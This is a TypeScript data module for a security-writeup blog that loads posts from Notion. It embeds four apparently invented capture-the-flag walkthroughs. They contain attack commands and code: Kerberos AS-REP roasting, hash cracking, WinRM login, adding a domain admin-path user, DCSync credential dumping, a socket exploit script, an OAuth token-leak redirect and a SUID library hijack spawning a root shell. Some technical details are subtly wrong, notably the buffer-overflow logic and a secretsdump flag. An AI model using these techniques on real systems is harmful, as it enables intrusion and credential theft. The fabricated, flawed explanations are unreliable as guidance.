import { Client } from '@notionhq/client';
import { cache } from 'react';
import fs from 'fs';
import path from 'path';

export interface BlogPost {
  id: string;
  title: string;
  slug: string;
  type: string;        // "Active Directory", "Web Application", "Reverse Engineering", "Privilege Escalation"
  platform: string;    // "HackTheBox", "TryHackMe", "PortSwigger", "HackMyVM"
  difficulty: string;  // "Easy", "Medium", "Hard", "Insane"
  tags: string[];
  published: boolean;
  featured: boolean;
  date: string;
  cover: string;
  summary: string;
  contentHtml?: string;
  contentMarkdown?: string;
  blocks?: Array<{
    type: string;
    content: string;
    language?: string;
    caption?: string;
  }>;
}

// Check if Notion API is configured
const isNotionConfigured = () => {
  return !!(process.env.NOTION_TOKEN && process.env.NOTION_DATABASE_ID);
};

// Initialize Notion client only if configured (lazy load to prevent crashes on startup)
let notionClient: Client | null = null;
const getNotionClient = (): Client | null => {
  if (!notionClient && isNotionConfigured()) {
    try {
      console.log('[DEBUG_NOTION] Initializing Notion Client. Token present:', !!process.env.NOTION_TOKEN);
      console.log('[DEBUG_NOTION] Type of Client imported:', typeof Client);
      
      // Handle potential default export vs named export discrepancies in ESM/CommonJS boundary
      let ClientConstructor: any = Client;
      if (!ClientConstructor && (Client as any).default) {
        ClientConstructor = (Client as any).default;
      }
      
      notionClient = new ClientConstructor({ auth: process.env.NOTION_TOKEN });
      console.log('[DEBUG_NOTION] Constructed client type:', typeof notionClient);
      if (notionClient) {
        console.log('[DEBUG_NOTION] Constructed client keys:', Object.keys(notionClient));
        console.log('[DEBUG_NOTION] client.databases exists:', !!(notionClient as any).databases);
        if ((notionClient as any).databases) {
          console.log('[DEBUG_NOTION] client.databases keys:', Object.keys((notionClient as any).databases));
        }
      }
    } catch (e) {
      console.error('[DEBUG_NOTION] Failed to initialize Notion client:', e);
    }
  }
  return notionClient;
};

// Realistic, high-fidelity mock writeups designed matching the specified properties
const FALLBACK_BLOGS: BlogPost[] = [
  {
    id: 'forest-htb-active-directory',
    title: 'Forest: AS-REP Roasting and BloodHound Orchestration in Active Directory',
    slug: 'forest-asrep-roast-bloodhound',
    type: 'Active Directory',
    platform: 'HackTheBox',
    difficulty: 'Medium',
    tags: ['Active Directory', 'AS-REP Roasting', 'Kerberos', 'BloodHound', 'Privilege Escalation'],
    published: true,
    featured: true,
    date: '2026-05-20',
    cover: 'https://images.unsplash.com/photo-1601597111158-2fceff270190?auto=format&fit=crop&q=80&w=1200',
    summary: 'A comprehensive walkthrough of the Forest HackTheBox machine. Exploiting Kerberos pre-authentication vulnerabilities (AS-REP Roasting) and using BloodHound profiles to audit logical domain paths.',
    blocks: [
      { type: 'paragraph', content: 'In this writeup we will detail the exploitation of "Forest", an active directory box from HackTheBox. This machine showcases how simple configuration holes like disabled Kerberos pre-authentication can compromise an entire Windows Domain controller via service delegation.' },
      { type: 'heading_2', content: 'Phase 1: Precision Service Identification (Nmap)' },
      { type: 'paragraph', content: 'Let\'s begin by scanning all active service banners on the target IP controller.' },
      { type: 'code', language: 'bash', content: 'nmap -sV -sC -p- -T4 --min-rate 1000 10.10.10.161' },
      { type: 'paragraph', content: 'Our port scan exposes active directory domain controllers running LDAP on port 389, Kerberos on port 88, and standard WinRM remote panels on port 5985:' },
      { type: 'code', language: 'text', content: 'PORT     STATE SERVICE      VERSION\n88/tcp   open  kerberos-sec Microsoft Windows Kerberos\n135/tcp  open  msrpc        Microsoft Windows RPC\n389/tcp  open  ldap         Microsoft Windows Active Directory LDAP\n445/tcp  open  microsoft-ds Windows Server 2016 Standard\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSD UPnP)' },
      { type: 'heading_2', content: 'Phase 2: User Enumeration and AS-REP Roasting' },
      { type: 'paragraph', content: 'We query user indexes anonymously through LDAP using impacket\'s samrdump, exposing several domain accounts. Among them, the account `svc-alfresco` has Kerberos pre-authentication disabled.' },
      { type: 'paragraph', content: 'This lets us send a dummy authentication request and receive an AS-REP ticket encrypted with the user\'s pass hash, which we can crack offline (AS-REP Roasting).' },
      { type: 'code', language: 'bash', content: 'GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161' },
      { type: 'paragraph', content: 'Executing the roasted request returns a valid John-readable Kerberos hash for svc-alfresco:' },
      { type: 'code', language: 'text', content: '$krb5asrep$23$svc-alfresco@HTB.LOCAL:d33e7bd5b89a9f5cbbd5...:$password_hash' },
      { type: 'paragraph', content: 'We pass this hash instantly to hashcat loaded with rockyou wordlists to recover the plaintext credentials:' },
      { type: 'code', language: 'bash', content: 'hashcat -m 18200 hash.txt rockyou.txt --force' },
      { type: 'paragraph', content: 'Hash cracked: `svc-alfresco : s3rvic3@123`' },
      { type: 'heading_2', content: 'Phase 3: BloodHound Domain Analysis' },
      { type: 'paragraph', content: 'Now that we obtain a valid initial access vector, we authenticate via WinRM remote terminal and load the BloodHound ingestion engine to graph paths to Domain Admin:' },
      { type: 'code', language: 'bash', content: 'evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvic3@123' },
      { type: 'paragraph', content: 'Inside the machine, we run SharpHound.exe to dump the enterprise active directory metadata, and ingest it into the local BloodHound console.' },
      { type: 'paragraph', content: 'BloodHound identifies that the `svc-alfresco` user belongs to the `Service Accounts` group, which is a nested member of the `Account Operators` system group. Users inside Account Operators have delegation privileges to create new users, modify group memberships, and delegate resource permissions!' },
      { type: 'heading_2', content: 'Phase 4: Privilege Escalation' },
      { type: 'paragraph', content: 'We create a new domain user and inject them directly into the target Exchange Windows Permissions system group. This group enjoys write access permissions over the root Domain object.' },
      { type: 'code', language: 'powershell', content: 'net user love07oj CyberSec1337! /add /domain\nnet group "Exchange Windows Permissions" love07oj /add /domain' },
      { type: 'paragraph', content: 'With control over Exchange Windows Permissions, we run DCSync to dump all domain credentials from the NTDS.dit database directly:' },
      { type: 'code', language: 'bash', content: 'secretsdump.py htb.local/love07oj:CyberSec1337!@10.10.10.161 -just-dc-ntlms' },
      { type: 'paragraph', content: 'Target compromised. Administrator hash successfully retrieved! Root flag unlocked.' }
    ]
  },
  {
    id: 'internal-tryhackme-re',
    title: 'Internal: From Binary Static Analysis to Active API Abuse',
    slug: 'internal-binary-static-re',
    type: 'Reverse Engineering',
    platform: 'TryHackMe',
    difficulty: 'Hard',
    tags: ['Reverse Engineering', 'Ghidra', 'API Exploitation', 'Buffer Overflow', 'Linux'],
    published: true,
    featured: false,
    date: '2026-05-14',
    cover: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1200',
    summary: 'A deep forensic analysis of custom compiled ELF binaries run inside a TryHackMe network. Reverse engineering cryptographic validation protocols using Ghidra and bypassing API filters.',
    blocks: [
      { type: 'paragraph', content: 'Security writeup analyzing a custom microservice binary deployed on local internal systems in TryHackMe. We show how binary disassembling exposes validation bugs that permit full server takeovers.' },
      { type: 'heading_2', content: 'Disassembling with Ghidra' },
      { type: 'paragraph', content: 'We isolate the custom API gatekeeper binary, `auth_portal`, running on port 8000. Downloading it for local analysis, we load it inside Ghidra to analyze the `main` loop and signature checks.' },
      { type: 'paragraph', content: 'Taking a look at the decompiled code, we locate a critical string comparison logic in a validation method:' },
      { type: 'code', language: 'cpp', content: 'int check_token(char *user_input) {\n    char secure_key[32] = "X-SEC-KEY-998242";\n    char user_buffer[16];\n    \n    // Vulnerable function: strcpy causes stack overwrite!\n    strcpy(user_buffer, user_input);\n    \n    return strcmp(user_buffer, secure_key) == 0;\n}' },
      { type: 'paragraph', content: 'Because standard `strcpy` does not limit the bounds of payload buffers, input exceeding 16 bytes overwrites the neighboring registers. By sending exactly 16 filler bytes followed by the key string, we can inject and validate credentials.' },
      { type: 'heading_2', content: 'Exploiting API Inconsistencies' },
      { type: 'paragraph', content: 'We construct a fast python script to exploit this buffer overwrite constraint over the socket directly:' },
      { type: 'code', language: 'python', content: 'import socket\nimport struct\n\ntarget_ip = "10.10.21.3"\nport = 8000\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_ip, port))\n\n# Filling stack to align with validation bypass parameters\npayload = b"A" * 16 + b"X-SEC-KEY-998242\\x00"\ns.send(payload + b"\\n")\nprint(s.recv(1024).decode())' },
      { type: 'paragraph', content: 'Running the tool instantly returns administrative credentials for the API host terminal.' }
    ]
  },
  {
    id: 'oauth-portswigger-web',
    title: 'Broken Authentication: Forging OAuth Redirect URIs in Secure Enterprises',
    slug: 'broken-auth-oauth-forgery',
    type: 'Web Application',
    platform: 'PortSwigger',
    difficulty: 'Medium',
    tags: ['Web Application', 'OAuth 2.0', 'Redirect URI', 'Token Leakage', 'PortSwigger'],
    published: true,
    featured: true,
    date: '2026-04-30',
    cover: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1200',
    summary: 'A forensic walk-through of modern OAuth token hijacking. Bypassing state validations, abusing regex weaknesses in redirect URI lists, and lateral escalation inside web portals.',
    blocks: [
      { type: 'paragraph', content: 'Modern web architectures offload login workflows completely to OAuth brokers. In this writeup from PortSwigger, we analyze how weak server-side checks on OAuth redirect parameters allow hackers to leak confidential session tokens.' },
      { type: 'heading_2', content: 'Analyzing the Authentication Setup' },
      { type: 'paragraph', content: 'When a user checks in via "Sign In with SecurityPortal", the application generates a redirect URI lookup request to authenticate:' },
      { type: 'code', language: 'html', content: 'GET /auth?client_id=web-portal-99&redirect_uri=https://web.portswigger.com/oauth-callback&state=secured_key_88' },
      { type: 'paragraph', content: 'The security server checks the requested `redirect_uri` against an allowed whitelist. However, the regex filter is configured with a wildcard check: `^https://web.portswigger.com/.*`' },
      { type: 'heading_2', content: 'Constructing Target Exploits' },
      { type: 'paragraph', content: 'We exploit this validation loophole by prepending directory traversals or secondary folder structures. Specifying a sub-directory containing open redirectors or custom comment hooks leaks tokens:' },
      { type: 'code', language: 'html', content: 'GET /auth?client_id=web-portal-99&redirect_uri=https://web.portswigger.com/..%2f..%2fexternal-domain-leak.com&state=secured_key_88' },
      { type: 'paragraph', content: 'By embedding this into an iframe on our rogue target domain, we automatically grab authorization codes from hitting victims.' }
    ]
  },
  {
    id: 'privesc-hackmyvm-linux',
    title: 'Root Access: Abusing SUID Shared Libraries in Native Linux Daemons',
    slug: 'root-access-suid-library-hijack',
    type: 'Privilege Escalation',
    platform: 'HackMyVM',
    difficulty: 'Easy',
    tags: ['Privilege Escalation', 'SUID', 'Shared Library', 'Linux', 'HackMyVM'],
    published: true,
    featured: false,
    date: '2026-04-12',
    cover: 'https://images.unsplash.com/photo-1629654297299-c8506221ca97?auto=format&fit=crop&q=80&w=1200',
    summary: 'Walking through a simple HackMyVM local privilege escalation. Hijacking dynamic linked libraries (.so) inside SUID binaries to execute server-level commands as root.',
    blocks: [
      { type: 'paragraph', content: 'This writeup demonstrates privilege scaling on HackMyVM. We pinpoint custom binaries with active SUID bits that reference incorrect shared object paths.' },
      { type: 'heading_2', content: 'Finding Active SUID Vulnerabilities' },
      { type: 'paragraph', content: 'We run standard shell diagnostics to expose binaries that execute with full root permissions:' },
      { type: 'code', language: 'bash', content: 'find / -perm -4000 -type f 2>/dev/null' },
      { type: 'paragraph', content: 'The output returns a custom file management daemon running globally at `/usr/local/bin/backup_mgr`.' },
      { type: 'heading_2', content: 'Abusing Dynamic Libraries (.so)' },
      { type: 'paragraph', content: 'Running `ldd` and `strace` over this binary reveals that it looks for a shared library named `libcustom_utils.so` inside standard relative folders (`/tmp` or `/dev/shm` before standard system directories).' },
      { type: 'code', language: 'bash', content: 'strace /usr/local/bin/backup_mgr 2>&1 | grep "libcustom_utils.so"' },
      { type: 'paragraph', content: 'Since our low-privilege shell already possesses read/write permission inside `/tmp`, we can compile a lightweight rogue validation library and place it inside `/tmp/libcustom_utils.so`.' },
      { type: 'paragraph', content: 'We construct a C template that opens a root-level terminal shell immediately on load:' },
      { type: 'code', language: 'cpp', content: '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid __attribute__ ((constructor)) init() {\n    unsetenv("LD_PRELOAD");\n    setuid(0);\n    setgid(0);\n    system("/bin/sh -p");\n}' },
      { type: 'paragraph', content: 'We compile compiling this into shared object files, place it in `/tmp`, and execute the target command:' },
      { type: 'code', language: 'bash', content: 'gcc -shared -o /tmp/libcustom_utils.so -fPIC payload.c\n/usr/local/bin/backup_mgr' },
      { type: 'paragraph', content: 'Success! Drop-down shell initialized as root.' }
    ]
  }
];

// Helper to convert Notion properties to our Blog structure
function parseNotionPage(page: any): BlogPost {
  const props = page.properties;
  
  // Extract Title
  let title = 'Untitled Writeup';
  if (props.Title?.title?.length > 0) {
    title = props.Title.title.map((t: any) => t.plain_text).join('');
  }
  
  // Extract Slug
  let slug = '';
  if (props.Slug?.rich_text?.length > 0) {
    slug = props.Slug.rich_text.map((t: any) => t.plain_text).join('');
  } else {
    slug = page.id; // fallback
  }
  // Trim and convert slug to a clean, URL-safe format block by replacing spaces with hyphens
  slug = slug.trim().toLowerCase().replace(/\s+/g, '-');

  // Extract Type (Select)
  const type = (props.Type?.select?.name || 'Vulnerability Analysis').trim();

  // Extract Platform (Select)
  const platform = (props.Platform?.select?.name || 'Local Lab').trim();

  // Extract Difficulty (Select)
  const difficulty = props.Difficulty?.select?.name || 'Medium';

  // Extract Tags (Multi-select)
  const tags = (props.Tags?.multi_select || []).map((t: any) => t.name);

  // Extract Published (Checkbox)
  const published = props.Published?.checkbox !== undefined ? props.Published.checkbox : true;

  // Extract Featured (Checkbox)
  const featured = props.Featured?.checkbox !== undefined ? props.Featured.checkbox : false;

  // Extract Date
  let date = new Date(page.created_time).toISOString().split('T')[0];
  if (props.Date?.date?.start) {
    date = props.Date.date.start;
  }

  // Extract Cover image
  let cover = 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1200';
  if (page.cover) {
    if (page.cover.type === 'external') {
      cover = page.cover.external.url;
    } else if (page.cover.type === 'file') {
      cover = page.cover.file.url;
    }
  } else if (props.Cover?.files?.length > 0) {
    const fileObj = props.Cover.files[0];
    if (fileObj.type === 'external') {
      cover = fileObj.external.url;
    } else if (fileObj.type === 'file') {
      cover = fileObj.file.url;
    }
  }

  // Extract Summary
  let summary = 'No summary provided for this security writeup.';
  if (props.Summary?.rich_text?.length > 0) {
    summary = props.Summary.rich_text.map((t: any) => t.plain_text).join('');
  }

  return {
    id: page.id,
    title,
    slug,
    type,
    platform,
    difficulty,
    tags,
    published,
    featured,
    date,
    cover,
    summary,
  };
}

// Convert Notion Blocks to simple structured objects for rendering
function parseNotionBlocks(blocks: any[]): Array<{ type: string; content: string; language?: string; caption?: string }> {
  const result: Array<{ type: string; content: string; language?: string; caption?: string }> = [];
  
  for (const block of blocks) {
    const type = block.type;
    let content = '';
    
    if (type === 'paragraph') {
      content = block.paragraph.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'paragraph', content });
    } else if (type === 'heading_1') {
      content = block.heading_1.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'heading_1', content });
    } else if (type === 'heading_2') {
      content = block.heading_2.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'heading_2', content });
    } else if (type === 'heading_3') {
      content = block.heading_3.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'heading_3', content });
    } else if (type === 'bulleted_list_item') {
      content = block.bulleted_list_item.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'bulleted_list_item', content });
    } else if (type === 'numbered_list_item') {
      content = block.numbered_list_item.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'numbered_list_item', content });
    } else if (type === 'code') {
      content = block.code.rich_text.map((t: any) => t.plain_text).join('');
      const language = block.code.language || 'text';
      result.push({ type: 'code', content, language });
    } else if (type === 'quote') {
      content = block.quote.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'quote', content });
    } else if (type === 'image') {
      const imgUrl = block.image.type === 'external' ? block.image.external.url : block.image.file.url;
      const caption = block.image.caption?.map((t: any) => t.plain_text).join('') || '';
      result.push({ type: 'image', content: imgUrl, caption });
    } else if (type === 'callout') {
      content = block.callout.rich_text.map((t: any) => t.plain_text).join('');
      if (content) result.push({ type: 'callout', content });
    }
  }
  
  return result;
}

// PUBLIC API ACTIONS

/**
 * Robust helper that handles database querying in Notion API.
 * It first retrieves the database. If it detects that the database is tied to an underlying data source,
 * it queries the data_source instead. Else it queries the database path directly.
 */
async function queryNotionDatabaseOrDataSource(
  client: any,
  databaseId: string,
  body: any
): Promise<any> {
  try {
    const dbMeta = await client.databases.retrieve({ database_id: databaseId });
    if (dbMeta && dbMeta.data_sources && dbMeta.data_sources.length > 0) {
      const dataSourceId = dbMeta.data_sources[0].id;
      console.log(`[NOTION_RESOLVER] Detected database tied to data source: ${dataSourceId}. Querying data source.`);
      return await client.request({
        path: `data_sources/${dataSourceId}/query`,
        method: 'POST',
        body,
      });
    }
  } catch (err) {
    console.warn('[NOTION_RESOLVER] Pre-query database metadata retrieval failed. Falling back to direct database query:', err);
  }

  console.log(`[NOTION_RESOLVER] Querying database: ${databaseId} directly.`);
  return await client.request({
    path: `databases/${databaseId}/query`,
    method: 'POST',
    body,
  });
}

export const fetchAllBlogs = cache(async (): Promise<BlogPost[]> => {
  try {
    const blogsPath = path.join(process.cwd(), 'data', 'blogs.json');
    if (fs.existsSync(blogsPath)) {
      const data = fs.readFileSync(blogsPath, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error('Failed to read local static blogs.json:', error);
  }

  console.log('Static blogs.json missing or failed. Returning fallback high-fidelity blogs.');
  return FALLBACK_BLOGS;
});

export const fetchBlogBySlug = cache(async (slug: string): Promise<BlogPost | null> => {
  const decodedSlug = decodeURIComponent(slug).trim().toLowerCase().replace(/\s+/g, '-');
  
  try {
    const postPath = path.join(process.cwd(), 'data', 'posts', `${decodedSlug}.json`);
    if (fs.existsSync(postPath)) {
      const data = fs.readFileSync(postPath, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error(`Failed to read local static post file for slug ${slug}:`, error);
  }

  console.log(`Static post file for slug ${slug} missing or failed. Checking inside of fallback items.`);
  const localPost = FALLBACK_BLOGS.find((p) => p.slug.trim().toLowerCase() === decodedSlug);
  return localPost || null;
});

